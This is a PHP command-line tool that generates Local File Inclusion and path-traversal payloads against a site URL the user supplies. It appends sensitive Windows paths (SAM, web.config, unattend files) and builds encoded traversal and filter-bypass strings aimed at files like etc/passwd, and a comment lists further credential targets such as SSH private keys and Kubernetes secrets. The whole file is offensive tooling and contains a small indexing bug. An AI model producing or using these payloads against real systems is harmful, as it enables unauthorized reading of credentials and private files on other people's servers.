<?php

function main()
{
    print "=====================================\n";
    print "====  Local File Inclusion (LFI) ====\n";
    print "====      G E N E R A T O R      ====\n";
    print "=====================================\n";
    print "Coded By ./BagusLinduPamungkas       \n";
    print "=====================================\n\n";

    echo "1. Windows\n";
    echo "2. Linux\n";
    echo "3. Bypass LFI\n";
    $pilihOS = readline("[+] Choose Method (OS) : ");

    $long = readline("[+] Long per/parameter (linux) : ");

    switch ($pilihOS) {
        case '1':
        
            $link = readline("[+] Site : ");
            $pathStr = ["",
                "c:/boot.ini",
                "c:/inetpub/logs/logfiles",
                "c:/inetpub/wwwroot/global.asa",
                "c:/inetpub/wwwroot/index.asp",
                "c:/inetpub/wwwroot/web.config",
                "c:/sysprep.inf",
                "c:/sysprep.xml",
                "c:/sysprep/sysprep.inf",
                "c:/sysprep/sysprep.xml",
                "c:/system32/inetsrv/metabase.xml",
                "c:/sysprep.inf",
                "c:/sysprep.xml",
                "c:/sysprep/sysprep.inf",
                "c:/sysprep/sysprep.xml",
                "c:/system volume information/wpsettings.dat",
                "c:/system32/inetsrv/metabase.xml",
                "c:/unattend.txt",
                "c:/unattend.xml",
                "c:/unattended.txt",
                "c:/unattended.xml",
                "c:/windows/repair/sam",
                "c:/windows/repair/system*/"];
            $windowsParam = readline("Choose Payload 1 - 22 : ");
            switch ($windowsParam) {
                case '1':
                    echo $link.$pathStr[1];
                break;
                case '2':
                    echo $link.$pathStr[2];
                break;
                case '3':
                    echo $link.$pathStr[3];
                break;
                case '4':
                    echo $link.$pathStr[4];
                break;
                case '5':
                    echo $link.$pathStr[5];
                break;
                case '6':
                    echo $link.$pathStr[6];
                break;
                case '7':
                    echo $link.$pathStr[7];
                break;
                case '8':
                    echo $link.$pathStr[8];
                break;
                case '9':
                    echo $link.$pathStr[19];
                break;
                case '10':
                    echo $link.$pathStr[10];
                break;
                case '11':
                    echo $link.$pathStr[11];
                break;
                case '12':
                    echo $link.$pathStr[12];
                break;
                case '13':
                    echo $link.$pathStr[13];
                break;
                case '14':
                    echo $link.$pathStr[14];
                break;
                case '15':
                    echo $link.$pathStr[15];
                break;
                case '16':
                    echo $link.$pathStr[16];
                break;
                case '17':
                    echo $link.$pathStr[17];
                break;
                case '18':
                    echo $link.$pathStr[18];
                break;
                case '19':
                    echo $link.$pathStr[19];
                break;
                case '20':
                    echo $link.$pathStr[20];
                break;
                case '21':
                    echo $link.$pathStr[21];
                break;
                case '22':
                    echo $link.$pathStr[22];
                break;
                default:
                echo "Try Again 1-22";
                break;
            }
            break;
        case '2':
        
            /*/etc/issue
        /etc/passwd
        /etc/shadow
        /etc/group
        /etc/hosts
        /etc/motd
        /etc/mysql/my.cnf
        /proc/1/fd/1
        /proc/self/environ
        /proc/version
        /proc/cmdline
        /proc/sched_debug
        /proc/mounts
        /proc/net/arp
        /proc/net/route
        /proc/net/tcp
        /proc/net/udp
        /proc/self/cwd/index.php
        /proc/self/cwd/main.py
        /home/$USER/.bash_history
        /home/$USER/.ssh/id_rsa
        /var/run/secrets/kubernetes.io/serviceaccount
        /var/lib/mlocate/mlocate.db
        /var/lib/mlocate.db */

            print "========== P A Y L O A D ==========\n";
            print "1. ../\n";
            print "2. %5c../ \n";
            print "3. ..\/ \n";
            print "4. %2e%2e%2f \n";
            print "5. %252e%252e%252f \n";
            print "6. %c0%ae%c0%ae%c0%af \n";
            print "7. %uff0e%uff0e%u2215 \n";
            print "8. %uff0e%uff0e%u2216 \n";
            print "9. ..././ \n";
            print "10. ....\/ \n";
            print "==================================== \n";
            $windowsParam = readline("Choose Payload : ");
            $parameter = readline("Input parameter, ex: etc/passwd : ");
            echo "Result!\n\n";

            $pathStr = [
                "",
                "../",
                "%5c../",
                "..\/",
                "%2e%2e%2f",
                "%252e%252e%252f",
                "%c0%ae%c0%ae%c0%af",
                "%uff0e%uff0e%u2215",
                "%uff0e%uff0e%u2216",
                "..././",
                "....\/",
            ];

            switch ($windowsParam) {
                case '1':
                    for ($i = 0; $i < $long; $i++) {
                        for ($j = 0; $j < $i; $j++) {
                            echo $pathStr[1];
                        }
                        echo $parameter . "\n";
                    }
                    break;
                case '2':
                    for ($i = 0; $i < $long; $i++) {
                        for ($j = 0; $j < $i; $j++) {
                            echo $pathStr[2];
                        }
                        echo $parameter . "\n";
                    }
                    break;
                case '3':
                    for ($i = 0; $i < $long; $i++) {
                        for ($j = 0; $j < $i; $j++) {
                            echo $pathStr[3];
                        }
                        echo $parameter . "\n";
                    }
                    break;
                case '4':
                    for ($i = 0; $i < $long; $i++) {
                        for ($j = 0; $j < $i; $j++) {
                            echo $pathStr[4];
                        }
                        echo $parameter . "\n";
                    }
                    break;
                case '5':
                    for ($i = 0; $i < $long; $i++) {
                        for ($j = 0; $j < $i; $j++) {
                            echo $pathStr[5];
                        }
                        echo $parameter . "\n";
                    }
                    break;
                case '6':
                    for ($i = 0; $i < $long; $i++) {
                        for ($j = 0; $j < $i; $j++) {
                            echo $pathStr[6];
                        }
                        echo $parameter . "\n";
                    }
                    break;
                case '7':
                    for ($i = 0; $i < $long; $i++) {
                        for ($j = 0; $j < $i; $j++) {
                            echo $pathStr[7];
                        }
                        echo $parameter . "\n";
                    }
                    break;
                case '8':
                    for ($i = 0; $i < $long; $i++) {
                        for ($j = 0; $j < $i; $j++) {
                            echo $pathStr[8];
                        }
                        echo $parameter . "\n";
                    }
                    break;
                case '9':
                    for ($i = 0; $i < $long; $i++) {
                        for ($j = 0; $j < $i; $j++) {
                            echo $pathStr[9];
                        }
                        echo $parameter . "\n";
                    }
                    break;
                case '10':
                    for ($i = 0; $i < $long; $i++) {
                        for ($j = 0; $j < $i; $j++) {
                            echo $pathStr[10];
                        }
                        echo $parameter . "\n";
                    }
                    break;
                default:
                    echo "Your input is invalid!";
                    break;
            }
            break;

        case '3':
        
            $pathStr = [
                "",
                "\..",
                "..;/",
                "%252e%252e//",
                "..%252f%252f",
                "..%255c%255c",
                "..%255c%252f",
                "..%252f%255c",
            ];
            echo "==== BYPASS LFI ====\n";
            echo "1. \..\n";
            echo "2. ..;/\n";
            echo "3. %252e%252e//\n";
            echo "4. ..%252f%252f\n";
            echo "5. ..%255c%255c\n";
            echo "6. ..%255c%252f\n";
            echo "7. ..%252f%255c\n";
            $windowsParam = readline("Choose Payload : ");
            $parameter = readline("Input parameter, ex: etc/passwd : ");
            echo "\n\n";
            switch ($windowsParam) {
                case '1':
                    for ($i = 0; $i < $long; $i++) {
                        for ($j = 0; $j < $i; $j++) {
                            echo $pathStr[1];
                        }
                        echo $parameter . "\n";
                    }
                    break;
                case '2':
                    for ($i = 0; $i < $long; $i++) {
                        for ($j = 0; $j < $i; $j++) {
                            echo $pathStr[2];
                        }
                        echo $parameter . "\n";
                    }
                    break;
                case '3':
                    for ($i = 0; $i < $long; $i++) {
                        for ($j = 0; $j < $i; $j++) {
                            echo $pathStr[3];
                        }
                        echo $parameter . "\n";
                    }
                    break;
                case '4':
                    for ($i = 0; $i < $long; $i++) {
                        for ($j = 0; $j < $i; $j++) {
                            echo $pathStr[4];
                        }
                        echo $parameter . "\n";
                    }
                    break;
                case '5':
                    for ($i = 0; $i < $long; $i++) {
                        for ($j = 0; $j < $i; $j++) {
                            echo $pathStr[5];
                        }
                        echo $parameter . "\n";
                    }
                    break;
                case '6':
                    for ($i = 0; $i < $long; $i++) {
                        for ($j = 0; $j < $i; $j++) {
                            echo $pathStr[6];
                        }
                        echo $parameter . "\n";
                    }
                    break;
                case '7':
                    for ($i = 0; $i < $long; $i++) {
                        for ($j = 0; $j < $i; $j++) {
                            echo $pathStr[7];
                        }
                        echo $parameter . "\n";
                    }
                    break;
                default:
                    echo "Input is invalid, please try again!";
                    break;
            }
            break;
        default:
            echo "Input is invalid, please try again!";
            break;
    }
}
main();

?>

